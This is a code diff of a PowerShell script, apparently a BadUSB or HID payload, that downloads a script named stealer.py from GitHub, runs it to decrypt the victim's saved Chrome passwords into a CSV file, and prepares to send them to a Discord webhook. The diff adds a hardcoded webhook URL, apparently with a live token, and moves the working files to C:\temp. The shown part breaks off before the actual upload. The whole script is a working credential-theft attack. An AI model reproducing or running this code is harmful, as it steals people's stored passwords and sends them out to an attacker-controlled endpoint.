@@ -1,11 +1,13 @@
-cd $env:USERPROFILE\Documents
+$dc = 'https://discord.com/api/webhooks/1140612515286499399/u5g7s3uMCSoJNCr3chf8xqpb94Jh2lYbhn7Lrw3_jqjfxXuNUUiNACq2VNtE4UaR-dkH'
+
+cd \temp
 
 #$filePath = "$env:LocalAppData\Programs\Python\Python311\python.exe"
 
 py -m pip install --upgrade pip --user
 py -m pip install pycryptodomex pywin32 --user
 
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/simen64/Simons-HID-Scripts/main/chrome-password-stealer/decrypt_chrome_password.py -OutFile $Env:USERPROFILE\Documents\stealer.py
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/simen64/Simons-HID-Scripts/main/chrome-password-stealer/decrypt_chrome_password.py -OutFile \temp\stealer.py
 
 #& $env:LocalAppData\Programs\Python\Python311\python.exe $Env:USERPROFILE\Documents\stealer.py
 # Search for Python in the PATH variable
@@ -14,7 +16,7 @@ $pythonExe = Get-Command python | Select-Object -ExpandProperty Source
 # Check if Python was found
 if ($pythonExe -ne $null) {
     # Execute the Python script using the found Python executable
-    & $pythonExe $Env:USERPROFILE\Documents\stealer.py
+    & $pythonExe \temp\stealer.py
 } else {
     Write-Host "Python not found in the PATH."
 }
@@ -25,7 +27,7 @@ Write-Host "Sending data to $dc"
 
 $user = $env:USERNAME
 
-$file = "C:\Users\$user\Documents\decrypted_password.csv"
+$file = "C:\temp\decrypted_password.csv"
 
 $message = "Extracted passwords:"
 
